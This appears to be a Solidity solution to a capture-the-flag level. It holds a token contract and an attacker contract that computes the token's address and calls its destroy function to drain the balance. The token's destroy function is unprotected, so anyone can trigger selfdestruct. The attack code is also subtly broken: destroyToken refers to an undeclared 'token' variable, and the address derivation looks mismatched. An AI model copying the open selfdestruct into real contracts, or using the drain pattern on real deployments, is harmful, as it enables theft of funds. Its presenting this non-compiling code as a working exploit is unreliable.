pragma solidity ^0.8.0;

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] -= _amount;
        balances[_to] += _amount;
    }

    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}

interface ISimpleToken {
    function destroy(address payable _to) external;
}


contract RecoveryAttackerFixed {
    address public levelInstance;
    address public userAddress;

    constructor(address _levelInstance) {
        levelInstance = _levelInstance;
        userAddress = msg.sender;
    }

    function calculateTokenAddress() public view returns (address) {
        bytes memory salt = hex'0000000000000000000000000000000000000000000000000000000000000000';
        bytes memory initCode = abi.encodePacked(
            type(SimpleToken).creationCode,
            abi.encode('MyToken', userAddress, 100000)
        );
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                levelInstance,
                keccak256(salt),
                keccak256(initCode)
            )
        );
        return address(uint160(bytes20(hash)));
    }

    function destroyToken() public {
        ISimpleToken(token).destroy(payable(address(this)));
    }
}
